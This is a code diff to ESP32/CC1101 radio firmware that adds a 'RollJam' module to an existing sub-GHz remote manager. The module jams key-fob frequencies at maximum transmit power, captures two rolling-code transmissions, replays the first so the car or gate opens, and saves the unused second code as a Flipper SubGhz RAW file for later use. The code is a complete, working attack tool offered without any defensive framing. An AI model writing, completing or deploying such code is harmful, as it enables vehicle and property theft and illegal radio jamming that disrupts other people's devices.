@@ -2449,6 +2449,265 @@ bool subghz_remote_manager_jammer_is_running(void) {
     return s_jammer_running;
 }
 
+/* ── RollJam ────────────────────────────────────────────────────────────── */
+
+#define ROLLJAM_RAW_MAX 2048
+
+static volatile bool s_rolljam_running = false;
+static volatile rolljam_phase_t s_rolljam_phase = ROLLJAM_PHASE_ARMED;
+static TaskHandle_t s_rolljam_task = NULL;
+static int32_t s_rolljam_code1[ROLLJAM_RAW_MAX];
+static size_t  s_rolljam_code1_len = 0;
+static int32_t s_rolljam_code2[ROLLJAM_RAW_MAX];
+static size_t  s_rolljam_code2_len = 0;
+
+typedef struct { uint32_t freq_hz; } subghz_rolljam_params_t;
+
+static void subghz_rolljam_task_fn(void *arg) {
+    subghz_rolljam_params_t *p = (subghz_rolljam_params_t *)arg;
+    uint32_t freq_hz = p->freq_hz;
+    free(p);
+
+    subghz_ant_switch_init();
+    subghz_ant_switch_apply(freq_hz);
+
+    spi_host_device_t host = subghz_spi_host_from_config();
+
+    spi_bus_config_t bus_cfg = {
+        .mosi_io_num   = CONFIG_SUBGHZ_SPI_MOSI_PIN,
+        .miso_io_num   = CONFIG_SUBGHZ_SPI_MISO_PIN,
+        .sclk_io_num   = CONFIG_SUBGHZ_SPI_SCK_PIN,
+        .quadwp_io_num = -1,
+        .quadhd_io_num = -1,
+        .max_transfer_sz = 32,
+    };
+    bool bus_owned = false;
+    esp_err_t err = spi_bus_initialize(host, &bus_cfg, SPI_DMA_CH_AUTO);
+    if (err == ESP_OK) {
+        bus_owned = true;
+    } else if (err == ESP_ERR_INVALID_STATE) {
+        err = ESP_OK;
+    }
+
+    spi_device_handle_t dev = NULL;
+    if (err == ESP_OK) {
+        spi_device_interface_config_t dev_cfg = {
+            .clock_speed_hz = CONFIG_SUBGHZ_SPI_CLOCK_HZ,
+            .mode           = 0,
+            .spics_io_num   = CONFIG_SUBGHZ_CSN_PIN,
+            .queue_size     = 1,
+        };
+        err = spi_bus_add_device(host, &dev_cfg, &dev);
+    }
+
+    if (err != ESP_OK || !dev) {
+        ESP_LOGE(TAG, "rolljam: spi init failed");
+        s_rolljam_phase = ROLLJAM_PHASE_ERROR;
+        goto rj_cleanup;
+    }
+
+    #define RJ_STROBE(s)   do { \
+        uint8_t _b = (s); \
+        spi_transaction_t _t = {.length=8, .tx_buffer=&_b, .flags=SPI_TRANS_USE_RXDATA}; \
+        spi_device_polling_transmit(dev, &_t); \
+    } while(0)
+    #define RJ_WRITE(r,v)  do { \
+        uint8_t _buf[2] = {(uint8_t)(r), (uint8_t)(v)}; \
+        spi_transaction_t _t = {.length=16, .tx_buffer=_buf, .flags=SPI_TRANS_USE_RXDATA}; \
+        spi_device_polling_transmit(dev, &_t); \
+    } while(0)
+
+    /* reset */
+    RJ_STROBE(CC1101_STROBE_SIDLE);
+    RJ_STROBE(CC1101_STROBE_SRES);
+    ets_delay_us(1000);
+    RJ_STROBE(CC1101_STROBE_SIDLE);
+
+    /* frequency */
+    uint32_t fw = (uint32_t)((((uint64_t)freq_hz) * 65536ULL) / 26000000ULL);
+    RJ_WRITE(CC1101_REG_FREQ2, (uint8_t)((fw >> 16) & 0xFF));
+    RJ_WRITE(CC1101_REG_FREQ1, (uint8_t)((fw >>  8) & 0xFF));
+    RJ_WRITE(CC1101_REG_FREQ0, (uint8_t)(fw & 0xFF));
+
+    /* max TX power */
+    RJ_WRITE(0x3E, 0xC0);
+    RJ_WRITE(0x22, 0x11);       /* FREND0: PATABLE[0] */
+
+    /* OOK async wide BW for effective jamming */
+    RJ_WRITE(CC1101_REG_IOCFG0,   0x0D); /* GDO0 = async RX clock (input during capture) */
+    RJ_WRITE(CC1101_REG_IOCFG2,   0x2E); /* GDO2 = high-Z */
+    RJ_WRITE(CC1101_REG_MDMCFG4,  0x07); /* BW ~812 kHz */
+    RJ_WRITE(CC1101_REG_MDMCFG3,  0x83);
+    RJ_WRITE(CC1101_REG_MDMCFG2,  0x30); /* OOK, no manchester */
+    RJ_WRITE(CC1101_REG_MDMCFG1,  0x00);
+    RJ_WRITE(CC1101_REG_MDMCFG0,  0x00);
+    RJ_WRITE(CC1101_REG_DEVIATN,  0x34);
+    RJ_WRITE(CC1101_REG_PKTCTRL0, 0x32); /* async TX/RX */
+    RJ_WRITE(CC1101_REG_PKTCTRL1, 0x00);
+    RJ_WRITE(CC1101_REG_MCSM0,    0x00); /* no autocal on state changes (fast switch) */
+    RJ_WRITE(CC1101_REG_AGCCTRL2, 0x03);
+    RJ_WRITE(CC1101_REG_AGCCTRL0, 0x40);
+
+    /* calibrate once */
+    RJ_STROBE(CC1101_STROBE_SCAL);
+    ets_delay_us(1200);
+
+    static int32_t rj_buf[ROLLJAM_RAW_MAX];
+
+    s_rolljam_phase = ROLLJAM_PHASE_ARMED;
+    ESP_LOGI(TAG, "rolljam started @ %lu Hz", (unsigned long)freq_hz);
+
+    gpio_num_t gdo0 = (gpio_num_t)CONFIG_SUBGHZ_GDO0_PIN;
+    gpio_set_direction(gdo0, GPIO_MODE_INPUT);
+
+    while (s_rolljam_running &&
+           s_rolljam_phase != ROLLJAM_PHASE_REPLAY &&
+           s_rolljam_phase != ROLLJAM_PHASE_DONE  &&
+           s_rolljam_phase != ROLLJAM_PHASE_ERROR) {
+
+        /* ── JAM window: 40 ms of continuous TX carrier ── */
+        RJ_WRITE(CC1101_REG_IOCFG0, 0x0B); /* GDO0 = async TX serial clock out */
+        RJ_WRITE(CC1101_REG_PKTCTRL0, 0x02); /* infinite, PN9 whitening */
+        RJ_STROBE(CC1101_STROBE_STX);
+
+        int64_t jam_end = esp_timer_get_time() + 40000; /* 40 ms */
+        while (esp_timer_get_time() < jam_end && s_rolljam_running) {
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
+        if (!s_rolljam_running) break;
+
+        /* ── CAPTURE window: 8 ms RX ── */
+        RJ_STROBE(CC1101_STROBE_SIDLE);
+        RJ_WRITE(CC1101_REG_IOCFG0,   0x0D); /* restore async RX */
+        RJ_WRITE(CC1101_REG_PKTCTRL0, 0x32);
+        gpio_set_direction(gdo0, GPIO_MODE_INPUT);
+        RJ_STROBE(CC1101_STROBE_SRX);
+
+        int64_t cap_end = esp_timer_get_time() + 8000; /* 8 ms */
+        int prev = gpio_get_level(gdo0);
+        int64_t last_edge = esp_timer_get_time();
+        int buf_idx = 0;
+
+        while (esp_timer_get_time() < cap_end) {
+            int cur = gpio_get_level(gdo0);
+            if (cur != prev) {
+                int64_t now = esp_timer_get_time();
+                int32_t dur = (int32_t)(now - last_edge);
+                if (dur < 1) dur = 1;
+                if (buf_idx < ROLLJAM_RAW_MAX) {
+                    rj_buf[buf_idx++] = prev ? dur : -dur;
+                }
+                last_edge = now;
+                prev = cur;
+            }
+        }
+
+        /* require ≥30 edges → real signal (not noise) */
+        if (buf_idx >= 30) {
+            if (s_rolljam_phase == ROLLJAM_PHASE_ARMED) {
+                memcpy(s_rolljam_code1, rj_buf, buf_idx * sizeof(int32_t));
+                s_rolljam_code1_len = buf_idx;
+                s_rolljam_phase = ROLLJAM_PHASE_GOT1;
+                ESP_LOGI(TAG, "rolljam: code1 captured (%d edges)", buf_idx);
+            } else if (s_rolljam_phase == ROLLJAM_PHASE_GOT1) {
+                memcpy(s_rolljam_code2, rj_buf, buf_idx * sizeof(int32_t));
+                s_rolljam_code2_len = buf_idx;
+                s_rolljam_phase = ROLLJAM_PHASE_REPLAY;
+                ESP_LOGI(TAG, "rolljam: code2 captured (%d edges)", buf_idx);
+            }
+        }
+    }
+
+    /* ── REPLAY code 1 so the car/gate actually opens ── */
+    if (s_rolljam_phase == ROLLJAM_PHASE_REPLAY && s_rolljam_code1_len > 0) {
+        RJ_STROBE(CC1101_STROBE_SIDLE);
+        /* switch GDO0 to async TX data input */
+        RJ_WRITE(CC1101_REG_IOCFG0,   0x2D); /* GDO0 = serial TX data input */
+        RJ_WRITE(CC1101_REG_PKTCTRL0, 0x32); /* async TX */
+        gpio_set_direction(gdo0, GPIO_MODE_OUTPUT);
+        gpio_set_level(gdo0, 0);
+
+        RJ_STROBE(CC1101_STROBE_STX);
+        ets_delay_us(500);
+
+        for (size_t i = 0; i < s_rolljam_code1_len; i++) {
+            int32_t d = s_rolljam_code1[i];
+            uint32_t abs_d = (uint32_t)(d < 0 ? -d : d);
+            int lvl = (d > 0) ? 1 : 0;
+            gpio_set_level(gdo0, lvl);
+            if (abs_d > 60000) abs_d = 60000; /* cap per edge */
+            ets_delay_us(abs_d);
+        }
+        gpio_set_level(gdo0, 0);
+        RJ_STROBE(CC1101_STROBE_SIDLE);
+        ESP_LOGI(TAG, "rolljam: code1 replayed");
+        s_rolljam_phase = ROLLJAM_PHASE_DONE;
+    }
+
+    #undef RJ_STROBE
+    #undef RJ_WRITE
+
+rj_cleanup:
+    gpio_set_direction(gdo0, GPIO_MODE_INPUT);
+    if (dev) spi_bus_remove_device(dev);
+    if (bus_owned) spi_bus_free(host);
+    ESP_LOGI(TAG, "rolljam task done (phase=%d)", (int)s_rolljam_phase);
+    s_rolljam_running = false;
+    s_rolljam_task = NULL;
+    vTaskDelete(NULL);
+}
+
+bool subghz_remote_manager_rolljam_start(uint32_t freq_hz) {
+    if (s_rolljam_running || s_rolljam_task) return false;
+    if (s_subghz_task || s_jammer_task) {
+        subghz_set_last_error("stop scanner/jammer before rolljam");
+        return false;
+    }
+    if (!subghz_validate_pin_config()) return false;
+    subghz_rolljam_params_t *p = malloc(sizeof(subghz_rolljam_params_t));
+    if (!p) return false;
+    p->freq_hz = freq_hz;
+    s_rolljam_code1_len = 0;
+    s_rolljam_code2_len = 0;
+    s_rolljam_phase = ROLLJAM_PHASE_ARMED;
+    s_rolljam_running = true;
+    if (xTaskCreate(subghz_rolljam_task_fn, "subghz_rolljam", 6144, p,
+                    configMAX_PRIORITIES - 2, &s_rolljam_task) != pdPASS) {
+        s_rolljam_running = false;
+        free(p);
+        return false;
+    }
+    return true;
+}
+
+void subghz_remote_manager_rolljam_stop(void) {
+    s_rolljam_running = false;
+}
+
+rolljam_phase_t subghz_remote_manager_rolljam_phase(void) {
+    return s_rolljam_phase;
+}
+
+bool subghz_remote_manager_rolljam_has_code2(void) {
+    return s_rolljam_code2_len > 0;
+}
+
+bool subghz_remote_manager_rolljam_save_code2(const char *path) {
+    if (s_rolljam_code2_len == 0 || !path) return false;
+    FILE *f = fopen(path, "w");
+    if (!f) return false;
+    fprintf(f, "Filetype: Flipper SubGhz RAW File\nVersion: 1\n");
+    fprintf(f, "Frequency: %lu\n", (unsigned long)433920000UL);
+    fprintf(f, "Preset: FuriHalSubGhzPresetOok270Async\n");
+    fprintf(f, "Protocol: RAW\nRAW_Data:");
+    for (size_t i = 0; i < s_rolljam_code2_len; i++) {
+        fprintf(f, " %ld", (long)s_rolljam_code2[i]);
+    }
+    fprintf(f, "\n");
+    fclose(f);
+    return true;
+}
+
 /* ─────────────────────────────────────────────────────────────────────── */
 
 #else
@@ -2554,5 +2813,11 @@ bool subghz_remote_manager_jammer_start(uint32_t freq_hz) {
 }
 void subghz_remote_manager_jammer_stop(void) {}
 bool subghz_remote_manager_jammer_is_running(void) { return false; }
+
+bool subghz_remote_manager_rolljam_start(uint32_t freq_hz) { (void)freq_hz; return false; }
+void subghz_remote_manager_rolljam_stop(void) {}
+rolljam_phase_t subghz_remote_manager_rolljam_phase(void) { return ROLLJAM_PHASE_ERROR; }
+bool subghz_remote_manager_rolljam_has_code2(void) { return false; }
+bool subghz_remote_manager_rolljam_save_code2(const char *path) { (void)path; return false; }
 
 #endif
